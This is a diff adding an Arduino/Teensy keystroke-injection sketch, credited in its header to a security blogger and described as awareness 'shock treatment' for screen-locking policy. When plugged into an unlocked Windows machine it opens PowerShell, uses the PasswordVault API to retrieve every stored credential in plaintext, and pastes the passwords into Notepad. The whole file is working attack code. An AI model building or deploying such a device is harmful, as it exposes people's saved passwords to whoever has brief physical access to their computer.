@@ -1,0 +1,113 @@
+/*
+  Author:         Davey Addison [ Secsi/@Supersafesecs ]
+  Github:         github.com/Secsi
+  Webby:          simpleinfosec.com
+
+  Script to dump passwords stored in the windows cached credentials area onto Notepad.
+  Script designed to act as a "shock treatment" to end users to enforce screen locking policies within a company.
+*/
+
+#if defined(CORE_TEENSY)
+#define LED_PIN 6
+#endif
+
+void setup()
+{
+
+  // allow controlling LED
+  pinMode(LED_PIN, OUTPUT);
+  // turn the LED on while running
+  digitalWrite(LED_PIN, HIGH);
+
+
+
+
+  delay(2000);
+  show_desktop();
+
+  delay(200);
+  posh();
+
+  delay(500);
+  Keyboard.println("$machine=hostname");
+  delay(200);
+  Keyboard.println("[void]");
+  delay(200);
+  Keyboard.println("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]");
+  delay(200);
+  Keyboard.println("$vault = New-Object Windows.Security.Credentials.PasswordVault");
+  delay(200);
+  Keyboard.println("$vault.RetrieveAll()|% { $_.RetrievePassword();$_ }|clip");
+  delay(200);
+  Keyboard.println("notepad");
+  delay(500);
+  Keyboard.println("! ! ! ! ! L O C K   Y O U R   S C R E E N ! ! ! ! !");
+  Keyboard.println("We got the following with a few seconds at your machine, while you were away.");
+  delay(1000);
+  send_paste();
+  send_alttab();
+  delay(200);
+  Keyboard.println("echo off|clip");
+  Keyboard.println("exit");
+}
+
+void loop(){
+    // blink quickly when complete
+  digitalWrite(LED_PIN, HIGH);
+  delay(200);
+  digitalWrite(LED_PIN, LOW);
+  delay(200);
+}
+
+void show_desktop(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.set_key1(KEY_D);
+  Keyboard.send_now();
+  delay(500);
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+void send_alttab(){
+  delay(1000);
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.set_key1(KEY_TAB);
+  Keyboard.send_now();
+  delay(100);
+
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  }
+
+void send_paste(){
+  delay(1000);
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.set_key1(KEY_V);
+  Keyboard.send_now();
+  delay(100);
+
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  }
+
+void posh(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.send_now();
+  delay(1000);
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(2000);
+  Keyboard.print("powershell");
+
+  delay(2000);
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+
+  delay(200);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+}
